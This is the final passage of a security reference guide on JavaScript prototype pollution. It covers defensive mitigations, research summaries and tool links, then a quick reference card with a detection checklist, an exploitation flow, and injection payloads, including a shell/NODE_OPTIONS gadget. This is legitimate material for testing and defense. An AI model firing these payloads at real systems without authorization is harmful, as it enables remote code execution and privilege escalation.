Object.getPrototypeOf(myObject); // null
```

### 13.4 Using Safer Alternatives

**Map** instead of plain objects for options:
```javascript
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');
options.evil;                    // 'polluted' (inherited)
options.get('evil');             // undefined (safe)
options.get('transport_url');    // 'https://normal-website.com'
```

**Set** for value storage:
```javascript
let options = new Set();
options.add('safe');
options.has('evil');     // false
options.has('safe');     // true
```

### 13.5 Secure JSON Parsing

Use `secure-json-parse` instead of `JSON.parse()` for untrusted input:

```javascript
const sjson = require('secure-json-parse');

// Throws SyntaxError if __proto__ or constructor.prototype found
sjson.parse(badJson, undefined, { 
    protoAction: 'error', 
    constructorAction: 'error' 
});

// Or silently remove them
sjson.parse(badJson, undefined, { 
    protoAction: 'remove', 
    constructorAction: 'remove' 
});
```

### 13.6 Node.js CLI Flags

```bash
# Disable __proto__ entirely (can be bypassed via constructor)
node --disable-proto=delete app.js
node --disable-proto=throw app.js
```

### 13.7 Recursive Merge Safety

When implementing recursive merge functions:
1. Check if the key is `__proto__`, `constructor`, or `prototype`
2. Use `Object.hasOwn()` or `Object.prototype.hasOwnProperty.call()`
3. Avoid copying inherited properties
4. Consider using `structuredClone()` for deep copies

---

## 14. Research Papers

### Silent Spring: Prototype Pollution Leads to RCE in Node.js
- **arXiv**: 2207.11171
- **Authors**: Shcherbakov et al.
- **Key Contribution**: First multi-staged framework using multi-label static taint analysis to identify prototype pollution in Node.js libraries and applications. Found 11 universal gadgets in core Node.js APIs leading to code execution. Manually exploited RCE in NPM CLI, Parse Server, and Node.js.

### GHunter: Universal Prototype Pollution Gadgets in JavaScript Runtimes
- **arXiv**: 2407.10812
- **Authors**: Cornelissen et al.
- **Key Contribution**: Systematic detection of gadgets in V8-based runtimes (Node.js and Deno). Identified 56 new gadgets in Node.js and 67 in Deno. Found arbitrary code execution (19), privilege escalation (31), path traversal (13). Systematized existing mitigations and identified a high-severity CVE due to incorrect fix.

### Unveiling the Invisible: Detection and Evaluation of PP Gadgets with Dynamic Taint Analysis
- **arXiv**: 2311.03919
- **Authors**: Shcherbakov et al.
- **Key Contribution**: Introduced **Dasty**, a semi-automated pipeline for identifying gadgets in server-side Node.js applications. Analyzed most dependent-upon NPM packages, found 1,269 server-side packages, built PoC exploits for 49 packages (ejs, nodemailer, workerpool). Found CVE-2023-31415 in a data visualization dashboard leading to RCE.

### Undefined-oriented Programming: Detecting and Chaining PP Gadgets in Node.js Template Engines
- **Authors**: Zhengyu Liu et al.
- **Key Contribution**: Methodology for constructing chains of prototype pollution gadgets in template engines.

### JavaScript Prototype Pollution Attack in NodeJS
- **Author**: Olivier Arteau
- **Key Contribution**: Seminal paper on exploitation and mitigation of prototype pollution on the server-side.

---

## 15. References

### Official Documentation & Academy
- PortSwigger Web Security Academy — Prototype Pollution: https://portswigger.net/web-security/prototype-pollution
- PortSwigger — Client-Side PP: https://portswigger.net/web-security/prototype-pollution/client-side
- PortSwigger — Server-Side PP: https://portswigger.net/web-security/prototype-pollution/server-side
- PortSwigger — Preventing PP: https://portswigger.net/web-security/prototype-pollution/preventing
- HackTricks — Client-Side PP: https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html

### Payload & Gadget Collections
- PayloadsAllTheThings — Prototype Pollution: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
- BlackFan — Client-Side PP Gadgets: https://github.com/BlackFan/client-side-prototype-pollution
- KTH-LangSec — Server-Side PP Gadgets: https://github.com/KTH-LangSec/server-side-prototype-pollution
- yuske — Server-Side PP: https://github.com/yuske/server-side-prototype-pollution
- renniepak — PP Payloads: https://github.com/renniepak/prototype-pollution-payloads
- 0dayCTF — PP Payloads: https://github.com/0dayCTF/PrototypePollutionPayloads
- aszx87410 — PP Study Notes: https://github.com/aszx87410/prototype-pollution-study-notes

### Tools
- pp-finder: https://github.com/yeswehack/pp-finder
- ppmap: https://github.com/dwisiswant0/ppmap
- ppfuzz: https://github.com/GeekyCat/ppfuzz
- PPScan: https://github.com/kleiton0x00/ppscan
- PortSwigger SSPP Scanner: https://github.com/PortSwigger/server-side-prototype-pollution
- secure-json-parse: https://github.com/fastify/secure-json-parse
- param-miner: https://github.com/portswigger/param-miner
- pp-debugger: https://github.com/GoogleChromeLabs/pp-debugger
- suspect-prototype-pollution: https://github.com/d0nutptr/suspect-prototype-pollution

### Research & Historical
- HoLyVieR — NorthSec 2018: https://github.com/HoLyVieR/prototype-pollution-nsec18
- artsploit — NorthSec 2018: https://github.com/artsploit/prototype-pollution-nsec18
- lirantal — PP Exploits: https://github.com/lirantal/prototype-pollution-exploits
- snyk-labs — nodejs-goof: https://github.com/snyk-labs/nodejs-goof/tree/master/prototype-pollution
- NozomiNetworks — BlackHat 2023: https://github.com/NozomiNetworks/blackhat-usa-2023-prototype-pollution
- denimgroup — denim-proto-pollution: https://github.com/denimgroup/denim-proto-pollution

### arXiv Papers
- Silent Spring (2207.11171): https://arxiv.org/abs/2207.11171
- GHunter (2407.10812): https://arxiv.org/abs/2407.10812
- Dasty (2311.03919): https://arxiv.org/abs/2311.03919

### PD Ecosystem
- nuclei-templates (PP): https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposures/prototype-pollution
- katana: https://github.com/projectdiscovery/katana
- httpx: https://github.com/projectdiscovery/httpx
- subfinder: https://github.com/projectdiscovery/subfinder
- interactsh: https://github.com/projectdiscovery/interactsh
- notify: https://github.com/projectdiscovery/notify
- uncover: https://github.com/projectdiscovery/uncover
- cariddi: https://github.com/edoardottt/cariddi
- smuggler: https://github.com/defparam/smuggler

### Blog Posts & Talks
- "A Pentester's Guide to Prototype Pollution Attacks" — Harsh Bothra
- "A tale of making internet pollution free" — s1r1us
- "Detecting Server-Side Prototype Pollution" — Daniel Thatcher
- "Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)" — Michał Bentkowski
- "Server Side Prototype Pollution: Blackbox Detection Without The DoS" — Gareth Heyes
- "Prototype pollution and bypassing client-side HTML sanitizers" — Michał Bentkowski
- "Prototype Pollution and Where to Find Them" — BitK & SakiiR
- "Server side prototype pollution, how to detect and exploit" — BitK
- "Remote Code Execution via Prototype Pollution in Blitz.js"

---

## Quick Reference Card

### Detection Checklist
- [ ] Test `__proto__[foo]=bar` in query string
- [ ] Test `__proto__.foo=bar` in query string
- [ ] Test `constructor[prototype][foo]=bar` in query string
- [ ] Test JSON body with `{"__proto__":{"foo":"bar"}}`
- [ ] Test JSON body with `{"constructor":{"prototype":{"foo":"bar"}}}`
- [ ] Check if injected property reflects in response
- [ ] Check JSON indentation changes (`json spaces`)
- [ ] Check status code changes on errors (`status`)
- [ ] Check CORS headers (`exposedHeaders`)
- [ ] Check charset behavior (`content-type` with utf-7)
- [ ] Use async detection with `NODE_OPTIONS` + `--inspect`

### Exploitation Flow
1. **Find Source** → URL param, JSON body, web message
2. **Confirm Pollution** → Check reflection or behavior change
3. **Find Gadget** → Look for properties used by app/libraries
4. **Chain to Sink** → innerHTML, eval, child_process, template engine, etc.
5. **Profit** → XSS, RCE, SSRF, PrivEsc, DoS

### Key Payloads to Try First
```
?__proto__[foo]=bar
?__proto__.foo=bar
?constructor[prototype][foo]=bar

{"__proto__":{"foo":"bar"}}
{"constructor":{"prototype":{"foo":"bar"}}}

{"__proto__":{"status":510}}
{"__proto__":{"json spaces":"    "}}
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=..."}}
```

---

*This document was compiled from multiple authoritative sources for bug hunting and security research purposes. Always ensure you have proper authorization before testing for vulnerabilities.*
